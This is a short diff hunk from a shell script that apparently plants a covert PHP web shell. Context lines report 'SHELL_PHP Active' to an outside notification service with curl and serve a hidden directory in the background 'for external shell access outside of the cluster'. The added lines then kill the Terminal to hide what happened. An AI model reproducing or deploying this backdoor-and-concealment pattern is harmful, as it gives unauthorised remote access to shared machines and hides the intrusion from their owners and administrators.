@@ -47,3 +47,6 @@ curl http://xdroid.net/api/message\?k\=$api_android\&t\=SHELL_PHP+Active\&c\=Use
 
 #Starting Php Server for external shell access outside of the cluster
 php -S 127.0.0.1:$PORT -t $HOME/._/shell_php > /dev/null &
+
+sleep 2s
+pkill Terminal
